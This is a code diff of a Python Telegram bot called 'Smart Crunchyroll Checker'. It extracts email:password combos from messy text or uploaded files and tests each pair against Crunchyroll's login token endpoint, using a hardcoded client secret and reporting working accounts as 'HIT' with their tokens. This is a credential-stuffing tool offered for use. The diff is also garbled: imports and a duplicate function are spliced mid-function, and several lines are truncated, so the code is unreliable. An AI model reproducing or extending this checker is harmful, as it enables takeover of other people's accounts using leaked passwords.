@@ -274,14 +274,54 @@ def crunchyroll_check(username: str, password: str):
         if not access_token:
             return "❌ Invalid credentials"
 
-        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"
+import os
+import asyncio
+import re
+import requests
+from uuid import uuid4
+from user_agent import generate_user_agent
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.constants import ParseMode
 
+
+def crunchyroll_check(username: str, password: str):
+    url = "https://beta-api.crunchyroll.com/auth/v1/token"
+    
+    headers = {
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": generate_user_agent()
+    }
+    
+    data = {
+        "grant_type": "password",
+        "username": username,
+        "password": password,
+        "scope": "offline_access",
+        "client_id": "y2arvjb0h0rgvtizlovy",
+        "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
+        "device_type": "Redmi",
+        "device_id": str(uuid4()),
+        "device_name": "Redmi note 8 pro"
+    }
+    
+    try:
+        response = requests.post(url, headers=headers, data=data, timeout=25)
+        if response.status_code != 200:
+            return "❌ Invalid credentials"
+        
+        token_data = response.json()
+        access_token = token_data.get("access_token")
+        if not access_token:
+            return "❌ Invalid credentials"
+        
+        return f"✅ **HIT**\nEmail: `{username}`\nToken: `{access_token[:60]}...`"
+    
     except Exception:
         return "⚠️ Check failed"
 
 
 def extract_combos(text: str):
-    # Strong regex for messy formats
     pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
     matches = re.findall(pattern, text)
     combos = [f"{email.strip()}:{pwd.strip()}" for email, pwd in matches if email and pwd]
@@ -291,8 +331,8 @@ def extract_combos(text: str):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🎉 **Smart Crunchyroll Checker**\n\n"
-        "Send any messy text with combos.\n"
-        "I will extract and check them automatically.",
+        "Send messy text or upload .txt file.\n"
+        "I will extract combos automatically.",
         parse_mode=ParseMode.MARKDOWN
     )
 
@@ -308,7 +348,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No email:password found.")
         return
 
-    await update.message.reply_text(f"✅ Extracted {len(combos)} combos. Checking...")
+    await update.message.reply_text(f"✅ Extracted {len(combos)} combos. Starting...")
 
     for i, combo in enumerate(combos, 1):
         email, password = combo.split(":", 1)
@@ -369,8 +409,7 @@ def main():
 
 
 if __name__ == "__main__":
-    main()ndler(filters.TEXT, handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    main()ment.ALL, handle_document))
 
     print("🚀 Smart Crunchyroll Checker v2 Running...")
     app.run_polling()
